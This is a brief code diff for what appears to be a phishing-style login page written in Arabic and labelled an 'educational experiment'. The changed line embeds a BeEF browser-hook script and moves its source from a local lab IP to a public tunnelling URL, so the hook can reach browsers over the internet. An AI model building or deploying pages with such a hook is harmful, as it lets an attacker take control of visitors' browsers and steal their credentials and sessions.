@@ -100,7 +100,7 @@ login_page_html = '''
 <html>
 <head>
     <!-- كود BeEF Hook -->
-    <script src="http://10.0.2.15:3000/hook.js"></script>
+    <script src="https://vl9cyt-ip-150-228-11-60.tunnelmole.net/hook.js"></script>
     <title>تسجيل الدخول - تجربة تعليمية</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
